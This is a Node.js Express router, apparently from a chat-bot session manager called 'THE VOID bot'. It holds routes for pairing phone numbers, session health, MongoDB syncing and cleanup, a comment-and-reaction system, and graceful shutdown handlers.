// **API ROUTES**

router.get('/', async (req, res) => {
    const { number } = req.query;
    if (!number) {
        return res.status(400).send({ error: 'Number parameter is required' });
    }

    const sanitizedNumber = number.replace(/[^0-9]/g, '');

    if (activeSockets.has(sanitizedNumber)) {
        const isActive = isSessionActive(sanitizedNumber);
        return res.status(200).send({
            status: isActive ? 'already_connected' : 'reconnecting',
            message: isActive ? 'This number is already connected and active' : 'Session is reconnecting',
            health: sessionHealth.get(sanitizedNumber) || 'unknown',
            connectionStatus: sessionConnectionStatus.get(sanitizedNumber) || 'unknown',
            storage: 'MongoDB'
        });
    }

    await EmpirePair(number, res);
});

router.get('/active', (req, res) => {
    const activeNumbers = [];
    const healthData = {};

    for (const [number, socket] of activeSockets) {
        if (isSessionActive(number)) {
            activeNumbers.push(number);
            healthData[number] = {
                health: sessionHealth.get(number) || 'unknown',
                connectionStatus: sessionConnectionStatus.get(number) || 'unknown',
                uptime: socketCreationTime.get(number) ? Date.now() - socketCreationTime.get(number) : 0,
                lastBackup: lastBackupTime.get(number) || null,
                isActive: true
            };
        }
    }

    res.status(200).send({
        count: activeNumbers.length,
        numbers: activeNumbers,
        health: healthData,
        pendingSaves: pendingSaves.size,
        storage: `MongoDB (${mongoConnected ? 'Connected' : 'Not Connected'})`,
        autoManagement: 'active'
    });
});

router.get('/ping', (req, res) => {
    const activeCount = Array.from(activeSockets.keys()).filter(num => isSessionActive(num)).length;

    res.status(200).send({
        status: 'active',
        message: 'AUTO SESSION MANAGER is running with MongoDB',
        activeSessions: activeCount,
        totalSockets: activeSockets.size,
        storage: `MongoDB (${mongoConnected ? 'Connected' : 'Not Connected'})`,
        pendingSaves: pendingSaves.size,
        autoFeatures: {
            autoSave: 'active sessions only',
            autoCleanup: 'inactive sessions deleted',
            autoReconnect: 'active with limit',
            mongoSync: mongoConnected ? 'active' : 'initializing'
        }
    });
});

router.get('/sync-mongodb', async (req, res) => {
    try {
        await syncPendingSavesToMongoDB();
        res.status(200).send({
            status: 'success',
            message: 'MongoDB sync completed',
            synced: pendingSaves.size
        });
    } catch (error) {
        res.status(500).send({
            status: 'error',
            message: 'MongoDB sync failed',
            error: error.message
        });
    }
});

router.get('/session-health', async (req, res) => {
    const healthReport = {};
    for (const [number, health] of sessionHealth) {
        healthReport[number] = {
            health,
            uptime: socketCreationTime.get(number) ? Date.now() - socketCreationTime.get(number) : 0,
            reconnectionAttempts: reconnectionAttempts.get(number) || 0,
            lastBackup: lastBackupTime.get(number) || null,
            disconnectedSince: disconnectionTime.get(number) || null,
            isActive: activeSockets.has(number)
        };
    }

    res.status(200).send({
        status: 'success',
        totalSessions: sessionHealth.size,
        activeSessions: activeSockets.size,
        pendingSaves: pendingSaves.size,
        storage: `MongoDB (${mongoConnected ? 'Connected' : 'Not Connected'})`,
        healthReport,
        autoManagement: {
            autoSave: 'running',
            autoCleanup: 'running',
            autoReconnect: 'running',
            mongoSync: mongoConnected ? 'running' : 'initializing'
        }
    });
});

router.get('/restore-all', async (req, res) => {
    try {
        const result = await autoRestoreAllSessions();
        res.status(200).send({
            status: 'success',
            message: 'Auto-restore completed',
            restored: result.restored,
            failed: result.failed
        });
    } catch (error) {
        res.status(500).send({
            status: 'error',
            message: 'Auto-restore failed',
            error: error.message
        });
    }
});

router.get('/cleanup', async (req, res) => {
    try {
        await autoCleanupInactiveSessions();
        res.status(200).send({
            status: 'success',
            message: 'Cleanup completed',
            activeSessions: activeSockets.size
        });
    } catch (error) {
        res.status(500).send({
            status: 'error',
            message: 'Cleanup failed',
            error: error.message
        });
    }
});

router.delete('/session/:number', async (req, res) => {
    try {
        const { number } = req.params;
        const sanitizedNumber = number.replace(/[^0-9]/g, '');

        if (activeSockets.has(sanitizedNumber)) {
            const socket = activeSockets.get(sanitizedNumber);
            if (socket?.ws) {
                socket.ws.close();
            } else if (socket?.end) {
                socket.end();
            } else if (socket?.logout) {
                await socket.logout();
            }
        }

        await deleteSessionImmediately(sanitizedNumber);

        res.status(200).send({
            status: 'success',
            message: `Session ${sanitizedNumber} deleted successfully`
        });
    } catch (error) {
        res.status(500).send({
            status: 'error',
            message: 'Failed to delete session',
            error: error.message
        });
    }
});

// New route to clear bad sessions
router.get('/clear-bad-session/:number', async (req, res) => {
    try {
        const { number } = req.params;
        const sanitizedNumber = number.replace(/[^0-9]/g, '');

        const cleared = await handleBadMacError(sanitizedNumber);

        res.status(200).send({
            status: cleared ? 'success' : 'failed',
            message: cleared ? `Session cleared for ${sanitizedNumber}` : 'Failed to clear session',
            action: 'retry_pairing'
        });
    } catch (error) {
        res.status(500).send({
            status: 'error',
            message: 'Failed to clear session',
            error: error.message
        });
    }
});

router.get('/mongodb-status', async (req, res) => {
    try {
        const mongoStatus = mongoose.connection.readyState;
        const states = {
            0: 'disconnected',
            1: 'connected',
            2: 'connecting',
            3: 'disconnecting'
        };

        const sessionCount = await getMongoSessionCount();

        res.status(200).send({
            status: 'success',
            mongodb: {
                status: states[mongoStatus],
                connected: mongoConnected,
                uri: MONGODB_URI.replace(/:[^:]*@/, ':****@'), // Hide password
                sessionCount: sessionCount
            }
        });
    } catch (error) {
        res.status(500).send({
            status: 'error',
            message: 'Failed to get MongoDB status',
            error: error.message
        });
    }
});

// **COMMENT SYSTEM API ROUTES**

// Helper function to generate user fingerprint
function generateUserFingerprint(req) {
    const ip = req.ip || req.connection.remoteAddress;
    const userAgent = req.get('User-Agent') || '';
    return require('crypto').createHash('sha256').update(ip + userAgent).digest('hex').slice(0, 16);
}

// Get paginated comments with sorting
router.get('/api/comments', async (req, res) => {
    try {
        // Check MongoDB connection
        if (!mongoConnected) {
            return res.json({
                comments: [],
                pagination: {
                    page: 1,
                    limit: 10,
                    total: 0,
                    totalPages: 0,
                    hasNext: false,
                    hasPrev: false
                }
            });
        }

        const page = Math.max(1, parseInt(req.query.page) || 1);
        const limit = Math.min(10, Math.max(1, parseInt(req.query.limit) || 10));
        const skip = (page - 1) * limit;

        // Add timeout to MongoDB operations
        const commentsPromise = Comment.aggregate([
            {
                $addFields: {
                    engagement: { 
                        $add: [
                            { $multiply: ['$replyCount', 2] },
                            '$likes',
                            { $multiply: ['$dislikes', -1] }
                        ]
                    }
                }
            },
            { $sort: { engagement: -1, timestamp: -1 } },
            { $skip: skip },
            { $limit: limit }
        ]);

        const countPromise = Comment.countDocuments();
        
        const timeoutPromise = new Promise((_, reject) => {
            setTimeout(() => reject(new Error('Database operation timeout')), 5000);
        });

        let comments, total;
        try {
            [comments, total] = await Promise.race([
                Promise.all([commentsPromise, countPromise]),
                timeoutPromise
            ]);
        } catch (timeoutError) {
            // Handle timeout specifically to ensure we return empty state
            console.error('❌ Database timeout in comments fetch:', timeoutError.message);
            throw timeoutError;
        }

        const totalPages = Math.ceil(total / limit);

        res.json({
            comments,
            pagination: {
                page,
                limit,
                total,
                totalPages,
                hasNext: page < totalPages,
                hasPrev: page > 1
            }
        });
    } catch (error) {
        console.error('❌ Error fetching comments:', error);
        
        // Return empty state on error instead of error response
        res.json({
            comments: [],
            pagination: {
                page: 1,
                limit: 10,
                total: 0,
                totalPages: 0,
                hasNext: false,
                hasPrev: false
            }
        });
    }
});

// Create new comment
router.post('/api/comments', async (req, res) => {
    try {
        const { name, message } = req.body;

        if (!name || !message) {
            return res.status(400).json({ error: 'Name and message are required' });
        }

        if (name.length > 50) {
            return res.status(400).json({ error: 'Name must be 50 characters or less' });
        }

        if (message.length > 500) {
            return res.status(400).json({ error: 'Message must be 500 characters or less' });
        }

        // Check MongoDB connection
        if (!mongoConnected) {
            return res.status(503).json({ error: 'Database temporarily unavailable. Please try again later.' });
        }

        const comment = new Comment({
            name: name.trim(),
            message: message.trim()
        });

        // Add timeout to MongoDB operation
        const savePromise = comment.save();
        const timeoutPromise = new Promise((_, reject) => {
            setTimeout(() => reject(new Error('Database operation timeout')), 5000);
        });

        const savedComment = await Promise.race([savePromise, timeoutPromise]);
        res.status(201).json(savedComment);
    } catch (error) {
        console.error('❌ Error creating comment:', error);
        
        // Handle timeout errors specifically
        if (error.message === 'Database operation timeout' || 
            error.message.includes('buffering timed out') ||
            error.message.includes('ETIMEOUT')) {
            return res.status(503).json({ error: 'Database temporarily unavailable. Please try again later.' });
        }
        
        res.status(500).json({ error: 'Failed to create comment. Please try again later.' });
    }
});

// Get replies for a comment
router.get('/api/comments/:id/replies', async (req, res) => {
    try {
        // Check MongoDB connection
        if (!mongoConnected) {
            return res.json([]);
        }

        const commentId = req.params.id;
        const replies = await Reply.find({ commentId }).sort({ timestamp: 1 });
        res.json(replies);
    } catch (error) {
        console.error('❌ Error fetching replies:', error);
        
        // Handle MongoDB-related errors gracefully
        if (isMongoDBError(error)) {
            return res.json([]);
        }
        
        res.status(500).json({ error: 'Failed to fetch replies' });
    }
});

// Add reply to comment
router.post('/api/comments/:id/reply', async (req, res) => {
    try {
        // Check MongoDB connection
        if (!mongoConnected) {
            return res.status(503).json({ error: 'Database temporarily unavailable. Please try again later.' });
        }

        const commentId = req.params.id;
        const { name, message } = req.body;

        if (!name || !message) {
            return res.status(400).json({ error: 'Name and message are required' });
        }

        if (name.length > 50) {
            return res.status(400).json({ error: 'Name must be 50 characters or less' });
        }

        if (message.length > 300) {
            return res.status(400).json({ error: 'Reply must be 300 characters or less' });
        }

        const reply = new Reply({
            commentId,
            name: name.trim(),
            message: message.trim()
        });

        await reply.save();

        // Update comment reply count and add reply reference
        await Comment.findByIdAndUpdate(commentId, {
            $inc: { replyCount: 1 },
            $push: { replies: reply._id }
        });

        res.status(201).json(reply);
    } catch (error) {
        console.error('❌ Error creating reply:', error);
        
        // Handle MongoDB-related errors gracefully
        if (isMongoDBError(error)) {
            return res.status(503).json({ error: 'Database temporarily unavailable. Please try again later.' });
        }
        
        res.status(500).json({ error: 'Failed to create reply' });
    }
});

// React to comment
router.post('/api/comments/:id/react', async (req, res) => {
    try {
        // Check MongoDB connection
        if (!mongoConnected) {
            return res.status(503).json({ error: 'Database temporarily unavailable. Please try again later.' });
        }

        const commentId = req.params.id;
        const { reaction } = req.body; // 'like' or 'dislike'
        const userFingerprint = generateUserFingerprint(req);

        if (!['like', 'dislike'].includes(reaction)) {
            return res.status(400).json({ error: 'Invalid reaction type' });
        }

        // Check if user already reacted
        const existingReaction = await Reaction.findOne({
            itemId: commentId,
            itemType: 'comment',
            userFingerprint
        });

        let updateOperation = {};

        if (existingReaction) {
            if (existingReaction.reaction === reaction) {
                // Remove reaction if same as existing
                await Reaction.deleteOne({ _id: existingReaction._id });
                updateOperation[`$inc`] = {};
                updateOperation[`$inc`][reaction === 'like' ? 'likes' : 'dislikes'] = -1;
            } else {
                // Change reaction
                await Reaction.updateOne(
                    { _id: existingReaction._id },
                    { reaction }
                );
                updateOperation[`$inc`] = {};
                updateOperation[`$inc`][reaction === 'like' ? 'likes' : 'dislikes'] = 1;
                updateOperation[`$inc`][existingReaction.reaction === 'like' ? 'likes' : 'dislikes'] = -1;
            }
        } else {
            // Add new reaction
            const newReaction = new Reaction({
                itemId: commentId,
                itemType: 'comment',
                userFingerprint,
                reaction
            });
            await newReaction.save();

            updateOperation[`$inc`] = {};
            updateOperation[`$inc`][reaction === 'like' ? 'likes' : 'dislikes'] = 1;
        }

        const updatedComment = await Comment.findByIdAndUpdate(
            commentId,
            updateOperation,
            { new: true }
        );

        res.json({
            success: true,
            comment: updatedComment,
            userReaction: existingReaction?.reaction === reaction ? null : reaction
        });
    } catch (error) {
        console.error('❌ Error reacting to comment:', error);
        
        // Handle MongoDB-related errors gracefully
        if (isMongoDBError(error)) {
            return res.status(503).json({ error: 'Database temporarily unavailable. Please try again later.' });
        }
        
        res.status(500).json({ error: 'Failed to process reaction' });
    }
});

// React to reply
router.post('/api/replies/:id/react', async (req, res) => {
    try {
        // Check MongoDB connection
        if (!mongoConnected) {
            return res.status(503).json({ error: 'Database temporarily unavailable. Please try again later.' });
        }

        const replyId = req.params.id;
        const { reaction } = req.body; // 'like' or 'dislike'
        const userFingerprint = generateUserFingerprint(req);

        if (!['like', 'dislike'].includes(reaction)) {
            return res.status(400).json({ error: 'Invalid reaction type' });
        }

        // Check if user already reacted
        const existingReaction = await Reaction.findOne({
            itemId: replyId,
            itemType: 'reply',
            userFingerprint
        });

        let updateOperation = {};

        if (existingReaction) {
            if (existingReaction.reaction === reaction) {
                // Remove reaction if same as existing
                await Reaction.deleteOne({ _id: existingReaction._id });
                updateOperation[`$inc`] = {};
                updateOperation[`$inc`][reaction === 'like' ? 'likes' : 'dislikes'] = -1;
            } else {
                // Change reaction
                await Reaction.updateOne(
                    { _id: existingReaction._id },
                    { reaction }
                );
                updateOperation[`$inc`] = {};
                updateOperation[`$inc`][reaction === 'like' ? 'likes' : 'dislikes'] = 1;
                updateOperation[`$inc`][existingReaction.reaction === 'like' ? 'likes' : 'dislikes'] = -1;
            }
        } else {
            // Add new reaction
            const newReaction = new Reaction({
                itemId: replyId,
                itemType: 'reply',
                userFingerprint,
                reaction
            });
            await newReaction.save();

            updateOperation[`$inc`] = {};
            updateOperation[`$inc`][reaction === 'like' ? 'likes' : 'dislikes'] = 1;
        }

        const updatedReply = await Reply.findByIdAndUpdate(
            replyId,
            updateOperation,
            { new: true }
        );

        res.json({
            success: true,
            reply: updatedReply,
            userReaction: existingReaction?.reaction === reaction ? null : reaction
        });
    } catch (error) {
        console.error('❌ Error reacting to reply:', error);
        
        // Handle MongoDB-related errors gracefully
        if (isMongoDBError(error)) {
            return res.status(503).json({ error: 'Database temporarily unavailable. Please try again later.' });
        }
        
        res.status(500).json({ error: 'Failed to process reaction' });
    }
});

// Helper function to check if error is MongoDB-related
function isMongoDBError(error) {
    return error.name === 'MongooseError' || 
           error.message.includes('buffering timed out') ||
           error.message.includes('operation timed out') ||
           error.code === 'ETIMEOUT' ||
           !mongoConnected;
}

// Get user's reactions (for frontend to know what user has already reacted to)
router.get('/api/user-reactions', async (req, res) => {
    try {
        // Check MongoDB connection
        if (!mongoConnected) {
            return res.json({});
        }

        const userFingerprint = generateUserFingerprint(req);
        const reactions = await Reaction.find({ userFingerprint });
        
        const userReactions = {};
        reactions.forEach(r => {
            userReactions[`${r.itemType}_${r.itemId}`] = r.reaction;
        });
        
        res.json(userReactions);
    } catch (error) {
        console.error('❌ Error fetching user reactions:', error);
        
        // Handle MongoDB-related errors gracefully
        if (isMongoDBError(error)) {
            return res.json({});
        }
        
        res.status(500).json({ error: 'Failed to fetch user reactions' });
    }
});

// **CLEANUP AND PROCESS HANDLERS**

process.on('exit', async () => {
    console.log('🛑 Shutting down auto-management...');

    if (autoSaveInterval) clearInterval(autoSaveInterval);
    if (autoCleanupInterval) clearInterval(autoCleanupInterval);
    if (autoReconnectInterval) clearInterval(autoReconnectInterval);
    if (autoRestoreInterval) clearInterval(autoRestoreInterval);
    if (mongoSyncInterval) clearInterval(mongoSyncInterval);

    // Save pending items
    await syncPendingSavesToMongoDB().catch(console.error);

    // Close all active sockets
    for (const [number, socket] of activeSockets) {
        try {
            if (socket?.ws) {
                socket.ws.close();
            } else if (socket?.end) {
                socket.end();
            } else if (socket?.logout) {
                await socket.logout();
            }
        } catch (error) {
            console.error(`Failed to close socket for ${number}:`, error);
        }
    }

    // Close MongoDB connection
    await mongoose.connection.close();

    console.log('✅ Shutdown complete');
});

process.on('SIGINT', async () => {
    console.log('\n🛑 Received SIGINT, shutting down gracefully...');

    // Save all active sessions before shutdown
    await autoSaveAllActiveSessions();

    // Sync with MongoDB
    await syncPendingSavesToMongoDB();

    process.exit(0);
});

process.on('SIGTERM', async () => {
    console.log('\n🛑 Received SIGTERM, shutting down gracefully...');

    // Save all active sessions before shutdown
    await autoSaveAllActiveSessions();

    // Sync with MongoDB
    await syncPendingSavesToMongoDB();

    process.exit(0);
});

process.on('uncaughtException', (err) => {
    console.error('❌ Uncaught exception:', err);

    // Try to save critical data
    syncPendingSavesToMongoDB().catch(console.error);

    setTimeout(() => {
        if (process.env.PM2_NAME) {
            exec(`pm2 restart ${process.env.PM2_NAME}`);
        } else {
            process.exit(1);
        }
    }, 5000);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason);
});

// MongoDB connection event handlers
mongoose.connection.on('connected', () => {
    console.log('✅ MongoDB connected');
    mongoConnected = true;
});

mongoose.connection.on('error', (err) => {
    console.error('❌ MongoDB connection error:', err);
    mongoConnected = false;
});

mongoose.connection.on('disconnected', () => {
    console.log('⚠️ MongoDB disconnected');
    mongoConnected = false;

    // Try to reconnect
    setTimeout(() => {
        initializeMongoDB();
    }, 5000);
});

// Initialize auto-management on module load
initializeAutoManagement();

// Log startup status
console.log('✅ Auto Session Manager started successfully with MongoDB');
console.log(`📊 Configuration loaded:
  - Storage: MongoDB Atlas
  - Auto-save: Every ${config.AUTO_SAVE_INTERVAL / 60000} minutes (active sessions only)
  - MongoDB sync: Every ${config.MONGODB_SYNC_INTERVAL / 60000} minutes
  - Auto-restore: Every ${config.AUTO_RESTORE_INTERVAL / 3600000} hour(s)
  - Auto-cleanup: Every ${config.AUTO_CLEANUP_INTERVAL / 60000} minutes (deletes inactive)
  - Disconnected cleanup: After ${config.DISCONNECTED_CLEANUP_TIME / 60000} minutes
  - Max reconnect attempts: ${config.MAX_FAILED_ATTEMPTS}
  - Bad MAC Handler: Active
  - Pending Saves: ${pendingSaves.size}
`);

// **DEVELOPMENT/TESTING MODE**
// In-memory storage for testing when MongoDB is unavailable
let testComments = [];
let testCommentIdCounter = 1;

// Development endpoints for testing comment functionality
router.get('/api/test-comments', async (req, res) => {
    try {
        const page = Math.max(1, parseInt(req.query.page) || 1);
        const limit = Math.min(10, Math.max(1, parseInt(req.query.limit) || 10));
        const skip = (page - 1) * limit;

        // Sort by timestamp (newest first)
        const sortedComments = [...testComments].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        const paginatedComments = sortedComments.slice(skip, skip + limit);
        const total = testComments.length;
        const totalPages = Math.ceil(total / limit);

        res.json({
            comments: paginatedComments,
            pagination: {
                page,
                limit,
                total,
                totalPages,
                hasNext: page < totalPages,
                hasPrev: page > 1
            }
        });
    } catch (error) {
        console.error('❌ Error fetching test comments:', error);
        res.status(500).json({ error: 'Failed to fetch comments' });
    }
});

router.post('/api/test-comments', async (req, res) => {
    try {
        const { name, message } = req.body;

        if (!name || !message) {
            return res.status(400).json({ error: 'Name and message are required' });
        }

        if (name.length > 50) {
            return res.status(400).json({ error: 'Name must be 50 characters or less' });
        }

        if (message.length > 500) {
            return res.status(400).json({ error: 'Message must be 500 characters or less' });
        }

        const newComment = {
            _id: `test-${testCommentIdCounter++}`,
            name: name.trim(),
            message: message.trim(),
            timestamp: new Date(),
            likes: 0,
            dislikes: 0,
            replyCount: 0,
            replies: []
        };

        testComments.push(newComment);
        console.log(`✅ Test comment created: ${newComment._id}`);
        res.status(201).json(newComment);
    } catch (error) {
        console.error('❌ Error creating test comment:', error);
        res.status(500).json({ error: 'Failed to create comment. Please try again later.' });
    }
});

// Initialize with some sample comments for testing
if (testComments.length === 0) {
    testComments = [
        {
            _id: 'sample-1',
            name: 'Demo User',
            message: 'This is a sample comment to show how the system works when the database is available.',
            timestamp: new Date(Date.now() - 24 * 60 * 60 * 1000), // 1 day ago
            likes: 5,
            dislikes: 0,
            replyCount: 2,
            replies: []
        },
        {
            _id: 'sample-2',
            name: 'Happy Customer',
            message: 'THE VOID bot is amazing! Love the multi-device support and all the features.',
            timestamp: new Date(Date.now() - 12 * 60 * 60 * 1000), // 12 hours ago
            likes: 12,
            dislikes: 1,
            replyCount: 0,
            replies: []
        }
    ];
}

// Export the router
module.exports = router;
